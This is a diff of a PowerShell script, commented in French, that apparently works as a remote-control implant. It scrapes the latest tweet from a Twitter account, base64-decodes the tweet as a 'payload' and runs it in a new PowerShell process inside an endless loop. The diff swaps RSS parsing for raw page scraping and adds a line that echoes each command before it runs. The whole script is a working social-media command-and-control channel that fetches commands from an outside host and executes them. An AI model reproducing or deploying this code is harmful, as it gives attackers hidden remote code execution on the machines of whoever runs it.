@@ -1,14 +1,10 @@
 function Get-LastCmd {
     # On utilise un générateur de feed RSS pour simplifier le parsing du flux Twitter
-    $Html = (Invoke-WebRequest -Uri "https://twitrss.me/twitter_user_to_rss/?user=S1mpleCC" -UseBasicParsing).Content
+    $Html = (Invoke-WebRequest -Uri "https://twitter.com/S1mpleCC" -UseBasicParsing).RawContent
 
-    # On travaille la string pour garder seulement le payload
-    $LastCMD = ([xml]$Html).GetElementsByTagName("item") | 
-                    Select-Object title, pubDate, @{l="date";e={$_.pubDate | Get-Date}} |
-                    Sort-Object -Property date -Descending | 
-                    Select-Object -First 1
-
-    return $LastCMD.title
+    # On sélectionne la bonne string et on garde seulement le payload
+    $LastCMD = ($Html.Replace("`t","").Replace("`n","").Replace(" ","").Split("<") | ? {$_ -match "class=`"TweetTextSize"} | Select-Object -First 1).Split(">")[1]
+    return $LastCMD
 }
 
 $PrevCmd = ""
@@ -18,6 +14,7 @@ while ($true) {
     if ($MyCmd -ne $PrevCmd) {
         $PrevCmd = $MyCmd
         $DecCmd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($MyCmd))
+        Write-Host "Executing : $($DecCmd)"
         Start-Process "powershell.exe" -ArgumentList "-Command `"$($DecCmd)`"" -NoNewWindow
     }
     else {
